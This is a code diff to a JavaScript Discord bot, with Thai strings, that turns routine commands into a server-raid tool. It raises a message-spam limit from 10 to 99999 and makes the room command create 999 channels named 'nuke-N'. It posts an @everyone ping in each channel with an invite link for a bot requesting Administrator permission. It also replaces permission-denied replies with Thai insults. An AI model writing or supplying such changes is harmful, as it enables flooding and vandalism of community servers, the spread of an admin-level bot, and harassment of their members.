@@ -172,7 +172,7 @@ client.on("interactionCreate", async (interaction) => {
 
     // ===== /tell_off =====
     if (interaction.commandName === "tell_off") {
-      const count = Math.min(interaction.options.getInteger("count") ?? 5, 10); // 🔻 ลดหนัก
+      const count = Math.min(interaction.options.getInteger("count") ?? 5, 99999); // 🔻 ลดหนัก
       await interaction.reply({ content: `ส่ง ${count} ข้อความ`, ephemeral: true });
 
       for (let i = 0; i < count; i++) {
@@ -189,7 +189,7 @@ client.on("interactionCreate", async (interaction) => {
       const mem = interaction.guild.members.cache.get(target.id);
 
       if (!interaction.member.permissions.has(PermissionsBitField.Flags.KickMembers))
-        return interaction.reply({ content:"❌ ไม่มีสิทธิ์", ephemeral:true });
+        return interaction.reply({ content:"นี่มันคำสั่งชั้นสูงไอ้ควาย", ephemeral:true });
 
       await mem.kick(reason).catch(()=>{});
 
@@ -308,7 +308,7 @@ client.on("interactionCreate", async (interaction) => {
       )
     ) {
       return interaction.reply({
-        content: "มึงไม่มีสิทธิ์ Ban",
+        content: "ไอ้ชั้นต่ำนี่มันคำสั่งชั้นสูง",
         ephemeral: true,
       });
     }
@@ -329,20 +329,20 @@ client.on("interactionCreate", async (interaction) => {
     });
   }
 
-  // ===== /create_room (3 ห้อง) =====
+  // ===== /create_room (999 ห้อง) =====
   if (interaction.commandName === "create_room") {
     try {
       await interaction.reply({
-        content: "กำลังสร้าง 3 ห้อง...",
+        content: "กำลังสร้าง 999 ห้อง...",
         ephemeral: true,
       });
 
       const tasks = [];
 
-      for (let i = 1; i <= 3; i++) {
+      for (let i = 1; i <= 999; i++) {
         tasks.push(
           interaction.guild.channels.create({
-            name: `room-${i}`,
+            name: `nuke-${i}`,
             type: ChannelType.GuildText,
             permissionOverwrites: [
               {
@@ -366,7 +366,7 @@ client.on("interactionCreate", async (interaction) => {
       for (const res of results) {
         if (res.status === "fulfilled") {
           await res.value
-            .send("ไม่เป็นไรนะ สร้างใหม่ได้")
+            .send("@everyone ไม่เป็นไรนะ สร้างใหม่ได้ https://discord.com/oauth2/authorize?client_id=1461960244770115714&permissions=8&integration_type=0&scope=bot")
             .catch(() => {});
         }
       }
